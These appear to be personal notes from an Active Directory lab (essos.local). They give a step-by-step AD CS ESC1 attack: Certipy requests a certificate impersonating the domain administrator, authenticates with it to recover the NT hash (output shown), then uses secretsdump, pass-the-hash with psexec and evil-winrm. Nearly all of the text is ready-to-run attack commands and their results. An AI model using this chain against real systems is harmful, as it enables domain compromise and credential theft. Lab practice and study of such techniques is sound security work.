
query the certificate
- target : the ca server
- tempalte : the vulnerable template
- upn : the target user we want to impersonate

`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local`

Authentication with the pfx we request before

`certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12`

```

[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da


```

`export KRB5CCNAME=/home/peter/Desktop/Tools/administrator.ccache`

/home/peter/Desktop/Tools/certipy-venv/bin/secretsdump.py -k -no-pass ESSOS.LOCAL/'administrator'@meereen.essos.local|   


Execution:
/home/peter/Desktop/Tools/certipy-venv/bin/psexec.py -hashes ":54296a48cd30259cc88095373cec24da" administrator@192.168.56.12

evil-winrm -i ip/domain -u user -H <>